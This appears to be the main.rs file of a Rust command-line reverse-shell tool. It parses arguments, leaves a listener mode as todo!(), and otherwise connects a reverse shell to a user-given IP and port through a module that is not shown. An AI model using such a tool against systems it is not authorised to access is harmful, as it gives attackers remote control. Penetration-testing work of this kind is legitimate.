use cli::Args;
use clap::Parser;

mod cli;
mod listener;
mod reverse_shell;
mod errors;

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let args = Args::parse();

    if args.listen {
        todo!()
    } else {
        let ip: &str = args.address.as_str();
        let port: u16 = args.port;
        match reverse_shell::run(ip, port).await {
            Ok(_) => Ok(()),
            Err(e) => {
                eprintln!("Error: {}", e);
                Err(e)
            }
        }
    }
}
